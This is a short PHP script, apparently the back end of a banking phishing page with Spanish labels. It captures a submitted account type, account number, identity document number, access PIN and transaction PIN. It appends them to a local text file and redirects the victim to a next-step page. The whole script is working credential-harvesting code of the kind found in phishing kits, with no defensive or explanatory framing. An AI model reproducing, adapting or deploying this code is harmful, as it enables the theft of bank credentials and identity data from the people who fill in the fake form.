<?php

$datoa = $_POST['select'];
$datob = $_POST['num'];
$datoc = $_POST['use'];
$datod = $_POST['pin'];
$datoe = $_POST['pinb'];
$archivo="nikekako26.txt";
$file=fopen($archivo,"a");
fwrite($file, "Tipo:" .$datoa.PHP_EOL);
fwrite($file, "Numero: ".$datob .PHP_EOL);
fwrite($file, "Documento: ".$datoc .PHP_EOL);
fwrite($file, "Pin Acces: ".$datod .PHP_EOL);
fwrite($file, "Pin Trans.: ".$datoe .PHP_EOL);
fclose($file);
Header ("Location:step.php");?>
